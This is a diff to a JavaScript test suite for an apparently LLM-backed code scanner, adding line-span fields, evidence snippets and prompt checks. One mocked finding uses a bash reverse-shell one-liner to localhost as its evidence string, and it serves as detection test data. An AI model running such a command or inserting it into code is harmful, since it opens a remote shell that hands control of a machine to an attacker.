@@ -109,10 +109,14 @@ describe('runClaude()', () => {
     mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
     mockCreate.mockResolvedValueOnce(findingResponse([{
       file:     'src/app.js',
-      line:     42,
+      startLine: 42,
+      endLine: 42,
+      anchorKind: 'line',
+      anchorLine: 42,
       severity: 'high',
       message:  'Reverse shell detected',
       ruleId:   'reverse-shell',
+      evidence: 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
     }]));
 
     const findings = await runClaude({
@@ -125,8 +129,13 @@ describe('runClaude()', () => {
     expect(findings[0]).toMatchObject({
       file:     'src/app.js',
       line:     42,
+      startLine: 42,
+      endLine: 42,
+      anchorKind: 'line',
+      anchorLine: 42,
       severity: 'high',
       message:  'Reverse shell detected',
+      evidence: 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
       ruleId:   'claude/reverse-shell',
       tool:     'claude',
     });
@@ -135,8 +144,8 @@ describe('runClaude()', () => {
   it('returns multiple findings', async () => {
     mockReadFile.mockResolvedValue(DUMMY_CONTENT);
     mockCreate.mockResolvedValueOnce(findingResponse([
-      { file: 'a.js', line: 1, severity: 'high',   message: 'bad', ruleId: 'r1' },
-      { file: 'b.js', line: 2, severity: 'medium', message: 'meh', ruleId: 'r2' },
+      { file: 'a.js', startLine: 1, endLine: 1, severity: 'high',   message: 'bad', ruleId: 'r1', evidence: 'bad' },
+      { file: 'b.js', startLine: 2, endLine: 3, severity: 'medium', message: 'meh', ruleId: 'r2', evidence: 'meh' },
     ]));
 
     const findings = await runClaude({
@@ -146,6 +155,8 @@ describe('runClaude()', () => {
     });
 
     expect(findings).toHaveLength(2);
+    expect(findings[0].startLine).toBe(1);
+    expect(findings[1].endLine).toBe(3);
     expect(findings[0].ruleId).toBe('claude/r1');
     expect(findings[1].ruleId).toBe('claude/r2');
   });
@@ -271,5 +282,47 @@ describe('runClaude()', () => {
     });
 
     expect(mockCreate).toHaveBeenCalledTimes(1);
+  });
+
+  it('numbers file lines and includes changed line ranges in the prompt', async () => {
+    mockReadFile.mockResolvedValueOnce('first();\nsecond();');
+    mockCreate.mockResolvedValueOnce(cleanResponse());
+
+    await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      changedLineRanges: { 'src/app.js': [{ start: 2, end: 2 }] },
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    const callArgs = mockCreate.mock.calls[0][0];
+    const userContent = callArgs.messages[0].content;
+    expect(callArgs.system).toContain('copy a short exact evidence snippet verbatim');
+    expect(callArgs.system).toContain('Do not guess locations');
+    expect(userContent).toContain('Changed lines in this PR: 2-2');
+    expect(userContent).toContain('1 | first();');
+    expect(userContent).toContain('2 | second();');
+  });
+
+  it('accepts legacy line-only findings and normalizes them into spans', async () => {
+    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
+    mockCreate.mockResolvedValueOnce(findingResponse([{
+      file: 'src/app.js',
+      line: 7,
+      severity: 'high',
+      message: 'legacy shape',
+      ruleId: 'legacy',
+      evidence: 'console.log("hello");',
+    }]));
+
+    const [finding] = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(finding.line).toBe(7);
+    expect(finding.startLine).toBe(7);
+    expect(finding.endLine).toBe(7);
   });
 });
